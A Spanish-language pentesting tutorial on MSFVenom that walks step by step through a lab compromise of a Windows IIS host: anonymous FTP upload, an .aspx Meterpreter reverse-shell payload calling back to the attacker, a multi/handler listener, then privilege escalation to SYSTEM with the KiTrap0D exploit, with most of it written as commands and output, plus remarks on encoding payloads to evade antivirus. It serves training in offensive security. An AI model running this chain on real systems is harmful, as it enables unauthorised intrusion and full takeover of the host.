`MSFVenom` es el sucesor de `MSFPayload` y `MSFEncode`, dos scripts independientes que solían trabajar en conjunto con `msfconsole` para proporcionar a los usuarios payloads altamente personalizables y difíciles de detectar para sus exploits.

`MSFVenom` es el resultado de la fusión de estas dos herramientas. Antes de esta herramienta, teníamos que canalizar (`|`) el resultado de `MSFPayload`, que se utilizaba para generar shellcode para una arquitectura de procesador y una versión de SO específicas, en `MSFEncode`, que contenía múltiples esquemas de codificación utilizados tanto para eliminar caracteres no válidos del shellcode como para evadir software antiguo de Anti-Virus (`AV`) y de prevención/detección de intrusiones (`IPS/IDS`).

Hoy en día, las dos herramientas combinadas ofrecen a los pentesters un método para crear rápidamente payloads para diferentes arquitecturas de host objetivo y versiones, teniendo la posibilidad de 'limpiar' su shellcode para que no encuentre errores al desplegarse. La evasión de AV es mucho más complicada hoy en día, ya que el análisis basado solo en firmas de archivos maliciosos es cosa del pasado. `Heuristic analysis, machine learning, and deep packet inspection` dificultan mucho más que un payload pase por varias iteraciones de un esquema de codificación para evadir cualquier buen software de AV. Como se vio en el módulo `Payloads`, enviar un payload simple con la misma configuración detallada anteriormente arrojó una tasa de detección de `52/65`. En términos de Analistas de Malware en todo el mundo, eso es un Bingo. (Todavía no se ha demostrado que los Analistas de Malware en todo el mundo realmente digan "eso es un Bingo").

---

## Creating Our Payloads

Supongamos que hemos encontrado un puerto FTP abierto que tenía credenciales débiles o estaba abierto al inicio de sesión anónimo por accidente. Ahora, supongamos que el servidor FTP en sí está vinculado a un servicio web que se ejecuta en el puerto `tcp/80` de la misma máquina y que todos los archivos encontrados en el directorio raíz de FTP se pueden ver en el directorio `/uploads` del servicio web. Supongamos también que el servicio web no tiene ningún control sobre lo que se nos permite ejecutar en él como cliente.

Supongamos que se nos permite hipotéticamente llamar a cualquier cosa que queramos desde el servicio web. En ese caso, podemos cargar una shell PHP directamente a través del servidor FTP y acceder a ella desde la web, activando el payload y permitiéndonos recibir una conexión TCP inversa desde la máquina víctima.

### Scanning the Target

```r
nmap -sV -T4 -p- 10.10.10.5

<SNIP>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### FTP Anonymous Access

```r
ftp 10.10.10.5

Connected to 10.10.10.5.
220 Microsoft FTP Service


Name (10.10.10.5:root): anonymous

331 Anonymous access allowed, send identity (e-mail name) as password.


Password: ******

230 User logged in.
Remote system type is Windows_NT.


ftp> ls

200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

Notando el `aspnet_client`, nos damos cuenta de que la máquina podrá ejecutar shells `.aspx`. Afortunadamente para nosotros, `msfvenom` puede hacerlo sin ningún problema.

### Generating Payload

```r
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

```r
ls

Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
```

Ahora, solo necesitamos navegar a `http://10.10.10.5/reverse_shell.aspx`, y activará el payload `.aspx`. Antes de hacer eso, sin embargo, deberíamos iniciar un listener en msfconsole para que la solicitud de conexión inversa se capture dentro de él.

### MSF - Setting Up Multi/Handler

```r
msfconsole -q 

msf6 > use multi/handler
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.5

LHOST => 10.10.14.5


msf6 exploit(multi/handler) > set LPORT 1337

LPORT => 1337


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337 
```

---

## Executing the Payload

Ahora podemos activar el payload `.aspx` en el servicio web. Hacerlo no cargará absolutamente nada visualmente en la página, pero al mirar hacia atrás en nuestro módulo `multi/handler`, habríamos recibido una conexión. Debemos asegurarnos de que nuestro archivo `.aspx` no contenga HTML, por lo que solo veremos una página web en blanco. Sin embargo, el payload se ejecuta en segundo plano de todos modos.


### MSF - Meterpreter Shell

```r
<...SNIP...>
[*] Started reverse TCP handler on 10.10.14.5:1337 

[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000


meterpreter > getuid

Server username: IIS APPPOOL\Web


meterpreter > 

[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died
```

Si la sesión de Meterpreter muere con demasiada frecuencia, podemos considerar codificarla para evitar errores durante la ejecución. Podemos elegir cualquier codificador viable, y finalmente mejorará nuestras posibilidades de éxito.

---

## Local Exploit Suggester

Como consejo, hay un módulo llamado `Local Exploit Suggester`. Usaremos este módulo para este ejemplo, ya que la shell de Meterpreter aterrizó en el usuario `IIS APPPOOL\Web`, que naturalmente no tiene muchos permisos. Además, ejecutar el comando `sysinfo` nos muestra que el sistema es de arquitectura x86, lo que nos da aún más razones para confiar en el Local Exploit Suggester.

### MSF - Searching for Local Exploit Suggester

```r
msf6 > search local exploit suggester

<...SNIP...>
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure

<SNIP>

msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set session 2

session => 2


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_s

chlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Teniendo estos resultados frente a nosotros, podemos elegir fácilmente uno de ellos para probar. Si el que elegimos no es válido después de todo, pasamos al siguiente. No todas las verificaciones son 100% precisas y no todas las variables son las mismas. Bajando por la lista, `bypassauc_eventvwr` falla debido a que el usuario de IIS no forma parte del grupo de administradores, lo cual es lo esperado por defecto. La segunda opción, `ms10_015_kitrap0d`, hace el truco.

### MSF - Local Privilege Escalation

```r
msf6 exploit(multi/handler) > search kitrap0d

Matching Modules
================

   #  Name                                     Disclosure Date  Rank   Check  Description
   -  ----                                     ---------------  ----   -----  -----------
   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D


msf6 exploit(multi/handler) > use 0
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     1338             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338

LPORT => 1338


msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3

SESSION => 3


msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.5:1338 
[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Injecting exploit into 3552 ...
[*] Exploit injected. Injecting payload into 3552...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```